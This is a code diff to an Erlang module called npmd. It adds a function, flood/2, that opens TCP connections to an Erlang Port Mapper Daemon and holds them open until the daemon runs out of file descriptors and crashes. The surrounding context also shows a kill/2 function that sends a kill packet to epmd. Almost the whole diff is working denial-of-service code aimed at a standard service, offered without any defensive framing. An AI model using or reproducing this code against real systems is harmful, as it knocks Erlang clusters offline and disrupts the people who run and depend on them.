@@ -32,7 +32,7 @@
 %%% Not the Erlang Port Mapper Daemon
 %%%
 -module(npmd).
--export([kill/2, names/2, epmd/1]).
+-export([kill/2, names/2, epmd/1, flood/2]).
 
 kill(IP, Port) ->
     Packet = list_to_binary([<<107,"OK">>]),
@@ -115,4 +115,22 @@ loop(Socket, Port) ->
             error_logger:info_report([{epmd, tcp_error}])
     end.
 
+% Attempt to generate a socket error so epmd will exit.
+% Here we will just exhaust epmd's file descriptors and
+% cause it to crash, but any socket error will work.
+flood(IP, Port) ->
+    case gen_tcp:connect(IP, Port, []) of
+        {ok, Socket} ->
+            Pid = spawn_link(fun() -> receive_and_wait(Socket) end),
+            ok = gen_tcp:controlling_process(Socket, Pid),
+            flood(IP, Port);
+        {error, emfile} -> emfile;
+        {error, enfile} -> enfile;
+        {error,econnrefused} -> ok;
+        Error -> Error
+    end.
+receive_and_wait(Socket) ->
+    receive
+        _ -> receive_and_wait(Socket)
+    end.
 
